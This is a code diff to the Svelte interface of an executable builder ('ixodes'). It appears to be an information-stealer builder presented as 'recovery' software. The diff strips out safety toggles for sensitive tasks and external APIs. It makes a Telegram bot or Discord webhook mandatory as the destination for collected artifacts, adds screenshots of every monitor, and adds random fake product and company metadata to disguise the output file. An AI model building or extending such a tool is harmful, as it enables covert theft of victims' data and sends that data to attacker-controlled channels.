@@ -4,17 +4,18 @@
   import { Button } from "$lib/components/ui/button";
   import { CardContent, CardHeader } from "$lib/components/ui/card";
   import {
-    Collapsible,
-    CollapsibleContent,
-    CollapsibleTrigger,
-  } from "$lib/components/ui/collapsible";
+    Select,
+    SelectItem,
+    SelectContent,
+    SelectTrigger
+  } from "$lib/components/ui/select";
   import { Input } from "$lib/components/ui/input";
   import { Label } from "$lib/components/ui/label";
   import { Separator } from "$lib/components/ui/separator";
   import { Switch } from "$lib/components/ui/switch";
+  import { brandingPresets } from "$lib/branding-presets";
+  import { toast } from "svelte-sonner";
   import {
-    CircleAlert,
-    ChevronDown,
     FolderOpen,
     Hammer,
     KeyRound,
@@ -72,10 +73,13 @@
     { id: "zoom", label: "Zoom" },
   ] as const;
 
-  let allowSensitive = $state(false);
-  let allowExternal = $state(false);
-  let artifactKey = $state("");
   let archivePassword = $state("");
+  let telegramToken = $state("");
+  let telegramChatId = $state("");
+  let discordWebhook = $state("");
+  let commMode = $state<"telegram" | "discord">("telegram");
+  let telegramChecked = $state(true);
+  let discordChecked = $state(false);
   let outputDir = $state("");
   let iconSource = $state("");
   let iconPreset = $state("none");
@@ -88,15 +92,35 @@
   let categoryState = $state<Record<string, boolean>>(
     Object.fromEntries(categories.map((category) => [category.id, true]))
   );
-  let advancedOpen = $state(false);
+  let captureScreenshots = $state(false);
 
   let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
   let buildError = $state("");
   let movedTo = $state("");
-  let toastMessage = $state("");
-  let toastOpen = $state(false);
-  let toastTimer: ReturnType<typeof setTimeout> | null = null;
   let successTimer: ReturnType<typeof setTimeout> | null = null;
+
+  const selectedCategories = () =>
+    categories.filter((category) => categoryState[category.id]).map((category) => category.id);
+
+  const telegramTokenValid = $derived(
+    telegramToken.trim().length === 0
+      ? true
+      : /^\d+:[A-Za-z0-9_-]{20,}$/.test(telegramToken.trim())
+  );
+  const telegramChatIdValid = $derived(
+    telegramChatId.trim().length === 0 ? true : /^-?\d+$/.test(telegramChatId.trim())
+  );
+  const discordWebhookValid = $derived(
+    discordWebhook.trim().length === 0
+      ? true
+      : /^https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+$/.test(
+          discordWebhook.trim()
+        )
+  );
+
+  let selectedCategoryCount = $derived(selectedCategories().length);
+  let hasCommunication = $derived(Boolean(commMode));
+  let canBuild = $derived(selectedCategoryCount > 0 && hasCommunication);
 
   $effect(() => {
     if (iconPreset !== "none" && iconSource.trim().length > 0) {
@@ -110,23 +134,37 @@
     }
   });
 
-  const showToast = (message: string) => {
-    toastMessage = message;
-    toastOpen = true;
-    if (toastTimer) {
-      clearTimeout(toastTimer);
+  $effect(() => {
+    telegramChecked = commMode === "telegram";
+    discordChecked = commMode === "discord";
+  });
+
+  const showToast = (message: string, title = "Notice", type: "info" | "error" = "info") => {
+    if (type === "error") {
+      toast.error(title, { description: message });
+    } else {
+      toast.message(title, { description: message });
     }
-    toastTimer = setTimeout(() => {
-      toastOpen = false;
-      toastTimer = null;
-    }, 6000);
   };
 
-  const selectedCategories = () =>
-    categories.filter((category) => categoryState[category.id]).map((category) => category.id);
-
   const toggleCategory = (id: string, checked: boolean) => {
+    if (!checked && selectedCategories().length <= 1 && categoryState[id]) {
+      showToast("At least one category must stay enabled.");
+      return;
+    }
     categoryState = { ...categoryState, [id]: checked };
+  };
+
+  const isCommInactive = (mode: "telegram" | "discord") => commMode !== mode;
+
+  const generateArtifactKey = () => {
+    const bytes = new Uint8Array(32);
+    crypto.getRandomValues(bytes);
+    let binary = "";
+    for (const byte of bytes) {
+      binary += String.fromCharCode(byte);
+    }
+    return btoa(binary);
   };
 
   const chooseOutputDir = async () => {
@@ -161,6 +199,15 @@
   };
 
   const runBuild = async () => {
+    if (!canBuild) {
+      const message = !hasCommunication
+        ? "Select Telegram or Discord before building."
+        : "Select at least one category before building.";
+      buildStatus = "error";
+      buildError = message;
+      showToast(message, "Build failed", "error");
+      return;
+    }
     buildStatus = "loading";
     buildError = "";
     movedTo = "";
@@ -172,11 +219,13 @@
           const result = (await invoke("build_ixodes", {
             request: {
               settings: {
-                allow_sensitive_tasks: allowSensitive,
-                allow_external_api: allowExternal,
                 allowed_categories: selectedCategories(),
-                artifact_key: artifactKey,
+                artifact_key: generateArtifactKey(),
                 archive_password: archivePassword,
+                telegram_token: telegramToken,
+                telegram_chat_id: telegramChatId,
+                discord_webhook: discordWebhook,
+                capture_screenshots: captureScreenshots,
               },
               branding: {
                 icon_source: iconSource,
@@ -195,7 +244,7 @@
       buildStatus = result.success ? "success" : "error";
       if (!result.success) {
         buildError = "Build failed. Check the output for details.";
-        showToast(buildError);
+        showToast(buildError, "Build failed", "error");
       } else {
         successTimer = setTimeout(() => {
           buildStatus = "idle";
@@ -205,23 +254,26 @@
     } catch (error) {
       buildStatus = "error";
       buildError = String(error);
-      showToast(buildError);
+      showToast(buildError, "Build failed", "error");
     }
+  };
+
+  const generateBranding = () => {
+    const preset =
+      brandingPresets[Math.floor(Math.random() * brandingPresets.length)];
+    productName = preset.productName;
+    fileDescription = preset.fileDescription;
+    companyName = preset.companyName;
+    productVersion = preset.productVersion;
+    fileVersion = preset.fileVersion;
+    copyright = preset.copyright;
+    iconSource = "";
+    iconPreset = preset.iconPreset;
   };
 </script>
 
-<main class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 py-6">
-  {#if toastOpen}
-    <div class="fixed right-6 top-6 z-50 max-w-sm rounded-lg border border-border/70 bg-background/95 px-4 py-3 text-sm text-foreground shadow-lg backdrop-blur">
-      <div class="flex items-start gap-3">
-        <CircleAlert class="mt-0.5 h-4 w-4 text-destructive" />
-        <div class="space-y-1">
-          <p class="font-semibold">Build failed</p>
-          <p class="text-xs text-muted-foreground">{toastMessage}</p>
-        </div>
-      </div>
-    </div>
-  {/if}
+<main class="dark min-h-screen bg-background text-foreground flex flex-col gap-6 pt-6 pb-4">
+  
   <CardHeader class="space-y-4 border-b border-border/60">
     <div class="flex items-center justify-between gap-4">
       <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
@@ -237,7 +289,7 @@
         Enabled categories
       </div>
       <p class="text-xs text-muted-foreground">
-        Toggle categories to include. Leaving all unchecked allows every category.
+        Toggle categories to include. At least one category is required.
       </p>
       <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
         {#each categories as category}
@@ -263,10 +315,158 @@
               data-category-switch
               class="cursor-pointer"
               checked={categoryState[category.id]}
+              onclick={(event) => {
+                if (categoryState[category.id] && selectedCategoryCount <= 1) {
+                  event.preventDefault();
+                  event.stopPropagation();
+                  showToast("At least one category must stay enabled.");
+                }
+              }}
               onCheckedChange={(checked) => toggleCategory(category.id, Boolean(checked))}
             />
           </div>
         {/each}
+      </div>
+    </div>
+
+    <div class="space-y-3">
+      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
+        <ShieldCheck class="h-4 w-4 text-primary" />
+        Screen capture
+      </div>
+      <div class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/20 px-4 py-3 text-sm">
+        <div>
+          <p class="text-sm font-semibold">Capture screenshots</p>
+          <p class="text-xs text-muted-foreground">
+            Saves a screenshot of each connected monitor during recovery.
+          </p>
+        </div>
+        <Switch bind:checked={captureScreenshots} />
+      </div>
+    </div>
+
+    <div class="space-y-4">
+      <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
+        <FolderOpen class="h-4 w-4 text-primary" />
+        Communication
+      </div>
+      <p class="text-xs text-muted-foreground">
+        Choose exactly one destination for sending recovery artifacts.
+      </p>
+      <div class="grid gap-4 md:grid-cols-2">
+        <div
+          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "telegram" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("telegram") ? "cursor-pointer opacity-50" : ""}`}
+          role="button"
+          tabindex="0"
+          onclick={() => {
+            if (commMode !== "telegram") {
+              commMode = "telegram";
+            }
+          }}
+          onkeydown={(event) => {
+            if (commMode === "telegram") return;
+            if (event.key === "Enter" || event.key === " ") {
+              event.preventDefault();
+              commMode = "telegram";
+            }
+          }}
+        >
+          <div class="flex items-center justify-between gap-3">
+            <div>
+              <p class="text-sm font-semibold">Telegram</p>
+              <p class="text-xs text-muted-foreground">Token + chat ID</p>
+            </div>
+            <Switch
+              bind:checked={telegramChecked}
+              onclick={(event) => event.stopPropagation()}
+              onCheckedChange={(checked) => {
+                commMode = checked ? "telegram" : "discord";
+              }}
+            />
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="telegram-token">
+              Telegram Token
+            </Label>
+            <Input
+              id="telegram-token"
+              placeholder="123456789:ABC..."
+              bind:value={telegramToken}
+              disabled={commMode !== "telegram"}
+              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramTokenValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
+            />
+            {#if commMode === "telegram"}
+              <p class="text-xs text-muted-foreground">
+                Format: bot token like <span class="font-mono">123456789:ABCDEF...</span>
+              </p>
+            {/if}
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="telegram-chat-id">
+              Telegram Chat ID
+            </Label>
+            <Input
+              id="telegram-chat-id"
+              placeholder="123456789"
+              bind:value={telegramChatId}
+              disabled={commMode !== "telegram"}
+              class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramChatIdValid && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
+            />
+            {#if commMode === "telegram"}
+              <p class="text-xs text-muted-foreground">
+                Numeric chat ID (e.g. <span class="font-mono">123456789</span> or <span class="font-mono">-1001234567890</span>).
+              </p>
+            {/if}
+          </div>
+        </div>
+        <div
+          class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "discord" ? "border-primary/70 bg-primary/5" : ""} ${isCommInactive("discord") ? "cursor-pointer opacity-50" : ""}`}
+          role="button"
+          tabindex="0"
+          onclick={() => {
+            if (commMode !== "discord") {
+              commMode = "discord";
+            }
+          }}
+          onkeydown={(event) => {
+            if (commMode === "discord") return;
+            if (event.key === "Enter" || event.key === " ") {
+              event.preventDefault();
+              commMode = "discord";
+            }
+          }}
+        >
+          <div class="flex items-center justify-between gap-3">
+            <div>
+              <p class="text-sm font-semibold">Discord</p>
+              <p class="text-xs text-muted-foreground">Webhook URL</p>
+            </div>
+            <Switch
+              bind:checked={discordChecked}
+              onclick={(event) => event.stopPropagation()}
+              onCheckedChange={(checked) => {
+                commMode = checked ? "discord" : "telegram";
+              }}
+            />
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="discord-webhook">
+              Discord Webhook URL
+            </Label>
+            <Input
+              id="discord-webhook"
+              placeholder="https://discord.com/api/webhooks/..."
+              bind:value={discordWebhook}
+              disabled={commMode !== "discord"}
+              class={`${commMode !== "discord" ? "pointer-events-none" : ""} ${!discordWebhookValid && commMode === "discord" ? "border-destructive focus-visible:ring-destructive/30" : ""}`}
+            />
+            {#if commMode === "discord"}
+              <p class="text-xs text-muted-foreground">
+                Full webhook URL like <span class="font-mono">https://discord.com/api/webhooks/…</span>
+              </p>
+            {/if}
+          </div>
+        </div>
       </div>
     </div>
 
@@ -282,69 +482,21 @@
       />
     </div>
 
-    <Collapsible bind:open={advancedOpen} class="space-y-4">
-      <CollapsibleTrigger>
-        <Button
-          variant="secondary"
-        >
-          <span>Advanced</span>
-          <ChevronDown
-            class={`h-4 w-4 transition-transform ${advancedOpen ? "rotate-180" : ""}`}
-          />
-        </Button>
-      </CollapsibleTrigger>
-      <CollapsibleContent class="space-y-4 rounded-lg border border-border/70 bg-muted/20 p-4">
-        <div class="grid gap-4 md:grid-cols-2">
-          <div class="rounded-md border border-border/70 bg-background/60 p-4">
-            <div class="flex items-center justify-between gap-4">
-              <div>
-                <p class="text-sm font-semibold">Allow sensitive tasks</p>
-                <p class="text-xs text-muted-foreground">
-                  Enables recovery tasks marked as sensitive.
-                </p>
-              </div>
-              <Switch bind:checked={allowSensitive} />
-            </div>
-          </div>
-          <div class="rounded-md border border-border/70 bg-background/60 p-4">
-            <div class="flex items-center justify-between gap-4">
-              <div>
-                <p class="text-sm font-semibold">Allow external API</p>
-                <p class="text-xs text-muted-foreground">
-                  Lets recovery tasks call external services.
-                </p>
-              </div>
-              <Switch bind:checked={allowExternal} />
-            </div>
-          </div>
-        </div>
-        <div class="space-y-3">
-          <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
-            <KeyRound class="h-4 w-4 text-primary" />
-            Artifact encryption key
-          </div>
-          <Label class="text-xs text-muted-foreground" for="artifact-key">
-            Base64-encoded 32-byte key used for artifact encryption.
-          </Label>
-          <Input
-            id="artifact-key"
-            placeholder="Base64 key (optional)"
-            bind:value={artifactKey}
-          />
-        </div>
-      </CollapsibleContent>
-    </Collapsible>
-
     <div class="space-y-4">
       <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
         <KeyRound class="h-4 w-4 text-primary" />
         Executable branding
       </div>
-      <p class="text-xs text-muted-foreground">
-        Windows embeds icon and version metadata into the executable. macOS/Linux apply only
-        when packaging an app bundle. Preset icons are embedded in the builder. Icons must be
-        square and between 256x256 and 512x512.
-      </p>
+      <div class="flex flex-wrap items-center justify-between gap-3">
+        <p class="text-xs text-muted-foreground">
+          Windows embeds icon and version metadata into the executable. macOS/Linux apply only
+          when packaging an app bundle. Preset icons are embedded in the builder. Icons must be
+          square and between 256x256 and 512x512.
+        </p>
+        <Button variant="outline" size="sm" onclick={generateBranding}>
+          Generate Random
+        </Button>
+      </div>
       <div class="grid gap-4 md:grid-cols-2">
         <div class="space-y-2">
           <Label class="text-xs text-muted-foreground" for="product-name">
@@ -383,62 +535,80 @@
           <Input id="copyright" placeholder="© 2026 Example Co." bind:value={copyright} />
         </div>
       </div>
-      <div class="grid gap-4 md:grid-cols-[1fr_auto]">
-        <Input
-          placeholder="Icon URL, file path, or directory"
-          bind:value={iconSource}
-          disabled={iconPreset !== "none"}
-        />
-        <Button variant="outline" onclick={chooseIconFile} disabled={iconPreset !== "none"}>
-          Choose icon
-        </Button>
-      </div>
-      <div class="grid gap-3 md:grid-cols-[1fr_auto]">
+      <div class="grid w-full items-start gap-3 md:grid-cols-[minmax(180px,0.35fr)_minmax(0,1fr)]">
         <div class="space-y-2">
           <Label class="text-xs text-muted-foreground" for="icon-preset">
             Preset icon
           </Label>
-          <select
-            id="icon-preset"
-            class="w-full rounded-md border border-input bg-background px-3 py-2 text-sm text-foreground"
+          <Select
+            type="single"
             bind:value={iconPreset}
             disabled={iconSource.trim().length > 0}
           >
-            {#each iconPresets as preset}
-              <option value={preset.id}>{preset.label}</option>
-            {/each}
-          </select>
+            <SelectTrigger id="icon-preset" class="w-full">
+              <span>{iconPreset}</span>
+            </SelectTrigger>
+            <SelectContent>
+              {#each iconPresets as preset (preset.id)}
+                <SelectItem value={preset.id}>{preset.label}</SelectItem>
+              {/each}
+            </SelectContent>
+          </Select>
+        </div>
+        <div class="space-y-2">
+          <Label class="text-xs text-muted-foreground">Custom icon</Label>
+          <div class="grid gap-3 md:grid-cols-[1fr_auto]">
+            <Input
+              placeholder="Icon URL, file path, or directory"
+              bind:value={iconSource}
+              disabled={iconPreset !== "none"}
+            />
+            <Button variant="outline" onclick={chooseIconFile} disabled={iconPreset !== "none"}>
+              Choose icon
+            </Button>
+          </div>
         </div>
       </div>
     </div>
 
     <Separator />
 
-    <div class="flex flex-wrap items-center justify-between gap-4">
-      <Button
-        size="lg"
-        class={`gap-2 transition-colors ${buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
-        onclick={runBuild}
-        disabled={buildStatus === "loading"}
-      >
-        <Hammer class="h-4 w-4" />
-        {buildStatus === "loading"
-          ? "Building..."
-          : buildStatus === "success"
-            ? "Success"
-            : "Build release"}
-      </Button>
-      <div class="grid gap-3 md:grid-cols-[1fr_auto]">
-        <Input
-          placeholder="Defaults to Desktop"
-          bind:value={outputDir}
-        />
-        <Button variant="outline" onclick={chooseOutputDir}>
-          Choose folder
+    <div class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur">
+      <div class="flex flex-wrap items-center justify-between gap-4">
+        <Button
+          size="lg"
+          class={`gap-2 transition-colors ${buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
+          onclick={runBuild}
+          disabled={buildStatus === "loading" || !canBuild}
+        >
+          <Hammer class="h-4 w-4" />
+          {buildStatus === "loading"
+            ? "Building..."
+            : buildStatus === "success"
+              ? "Success"
+              : "Build release"}
         </Button>
+        <div class="text-xs text-muted-foreground">
+          <div class="flex items-center gap-2">
+            <span class={hasCommunication ? "text-emerald-500" : "text-destructive"}>
+              {hasCommunication ? "Communication set" : "Select Telegram or Discord"}
+            </span>
+            <span class="text-muted-foreground">•</span>
+            <span class={selectedCategoryCount > 0 ? "text-emerald-500" : "text-destructive"}>
+              {selectedCategoryCount > 0 ? `${selectedCategoryCount} categories` : "Pick a category"}
+            </span>
+          </div>
+        </div>
+        <div class="grid gap-3 md:grid-cols-[1fr_auto]">
+          <Input
+            placeholder="Defaults to Desktop"
+            bind:value={outputDir}
+          />
+          <Button variant="outline" onclick={chooseOutputDir}>
+            Choose folder
+          </Button>
+        </div>
       </div>
     </div>
-
-    
   </CardContent>
 </main>
